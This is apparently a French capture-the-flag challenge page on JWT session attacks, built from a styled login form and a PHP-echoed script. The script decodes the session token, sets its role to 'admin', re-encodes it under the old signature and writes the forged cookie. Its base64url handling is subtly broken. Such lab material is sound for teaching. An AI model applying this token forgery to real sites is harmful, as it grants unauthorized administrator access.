<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dossier 04 – Attaque de session et contrôle d'accès</title>
  <style>
    body {
      font-family: 'Courier New', Courier, monospace;
      margin: 0;
      padding: 0;
      background-color: #0d0d0d;
      color: #f2f2f2;
    }

    header {
      background-color: #1a1a1a;
      padding: 40px 20px;
      text-align: center;
      border-bottom: 4px solid #FFD700;
    }

    h1 {
      font-size: 2.3em;
      margin: 0;
      color: #FFD700;
      letter-spacing: 1px;
    }

    .subtitle {
      font-style: italic;
      color: #ccc;
      margin-top: 10px;
    }

    section {
      padding: 50px 20px;
      max-width: 600px;
      margin: auto;
    }

    h2 {
      font-size: 1.8em;
      border-left: 6px solid #FFD700;
      padding-left: 15px;
      margin-bottom: 20px;
    }

    form {
      background-color: #1b1b1b;
      padding: 25px;
      border: 2px solid #FFD700;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.1);
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #FFD700;
    }

    input[type="text"],
    input[type="password"] {
      padding: 10px;
      margin-bottom: 20px;
      width: 100%;
      border: 1px solid #FFD700;
      border-radius: 5px;
      background-color: #121212;
      color: #fff;
    }

    button {
      background-color: #FFD700;
      color: #000;
      padding: 10px 20px;
      border: none;
      cursor: pointer;
      font-weight: bold;
      border-radius: 5px;
      transition: background-color 0.2s ease;
    }

    button:hover {
      background-color: #e6c200;
    }

    #errorMessage {
      color: red;
      margin-top: 10px;
      display: none;
    }

    footer {
      text-align: center;
      padding: 20px;
      background-color: #111;
      color: #888;
      border-top: 2px solid #FFD700;
      font-size: 0.9em;
    }
  </style>
</head>
<body>
  <header>
    <h1>🕵️ Dossier 04 : Attaque de session et contrôle d'accès</h1>
    <p class="subtitle">Challenge expert – Manipulation avancée des cookies et des tokens JWT...</p>
  </header>

  <section>
    <h2>🔐 Contrôle d'accès via JWT</h2>
    <p>
      Vous avez intercepté un cookie contenant un JWT. Ce cookie est utilisé pour maintenir la session et contrôler l'accès aux pages protégées. 
      Mais que se passerait-il si vous pouviez manipuler ce JWT pour devenir un administrateur ?
      Votre mission : exploiter cette faiblesse pour obtenir un accès privilégié et découvrir le flag.
    </p>

    <form id="loginForm">
      <label for="username">Nom d'utilisateur :</label>
      <input type="text" id="username" name="username" required />

      <label for="password">Mot de passe :</label>
      <input type="password" id="password" name="password" required />

      <button type="submit">Se connecter</button>
      <p id="errorMessage">Accès refusé. Données incorrectes.</p>
    </form>
  </section>

  <footer>
    <p>&copy; 2025 - CTF Enquête & Sécurité - Tous droits réservés</p>
  </footer>

  <?php
  // Le code PHP pour injecter le script JavaScript permettant de manipuler le cookie JWT
  echo "<script type='text/javascript'>";
  echo "(function() {";
  echo "  var cookie = document.cookie;";
  echo "  var jwt = cookie.split('=')[1];"; // Extraction du JWT du cookie

  echo "  // Analyser et manipuler le JWT (peut-être en modifiant le rôle ou d'autres données)";
  echo "  // Par exemple, nous allons décoder la partie du payload du JWT et essayer de la manipuler";
  echo "  function decodeJWT(token) {";
  echo "    var base64Url = token.split('.')[1];";
  echo "    var base64 = base64Url.replace('-', '+').replace('_', '/');";
  echo "    return JSON.parse(window.atob(base64));";
  echo "  }";

  echo "  // Décodage du JWT";
  echo "  var decodedJWT = decodeJWT(jwt);";

  // Manipulation des données JWT pour simuler un rôle admin
  echo "  decodedJWT.role = 'admin';"; // Changer le rôle en 'admin'
  
  // Recréer le JWT modifié et envoyer la requête avec le cookie modifié
  echo "  var modifiedJWT = jwt.split('.')[0] + '.' + btoa(JSON.stringify(decodedJWT)) + '.' + jwt.split('.')[2];";
  echo "  document.cookie = 'session=' + modifiedJWT + ';path=/;';";
  echo "  alert('Vous êtes désormais un administrateur ! Redirigez-vous vers la page protégée pour trouver le flag.');";
  echo "})();";
  echo "</script>";
  ?>

</body>
</html>
